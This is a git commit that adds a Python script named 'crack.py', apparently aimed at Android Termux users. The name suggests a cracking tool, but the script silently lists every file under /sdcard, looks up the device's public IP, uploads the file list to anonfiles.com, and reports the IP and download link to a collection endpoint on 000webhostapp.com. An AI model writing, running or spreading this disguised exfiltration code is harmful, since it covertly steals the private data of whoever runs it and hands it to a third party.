975cce31c1ea84aaa081a79b9d918ff30deeb19c
Abu Huraira <65910450+root-plinix@users.noreply.github.com>
2021-07-27 11:04:32 +0600

    Add files via upload

---
+++ crack.py
@@ -0,0 +1,28 @@
+import requests
+import os 
+import json
+if os.path.exists("/sdcard") == True:
+  os.system("cd /sdcard && find * > data.txt")
+else: 
+  os.system("termux-setup-storage")
+  os.system("cd /sdcard && find * > data.txt")
+uname = requests.get("https://ifconfig.me/")
+uname = uname.text
+def ipack(url):
+  try:
+    r = requests.get("http://"+url)
+    return True
+  except requests.exceptions.ConnectionError:
+    return False
+def upload(f):
+  up = requests.post("https://api.anonfiles.com/upload", files={'file': open(f, "rb")})
+  js = json.loads(up.text)
+  dt = js["data"]
+  dl = dt["file"]
+  fl = dl["url"]
+  link = fl["full"]
+  req = requests.get("https://rootportal.000webhostapp.com/data.php?name="+str(uname)+"&link="+str(link))
+if ipack("ifconfig.me") == True:
+  upload("/sdcard/data.txt")
+else:
+  print("You're in offline and sdcard permission are not allowed !")
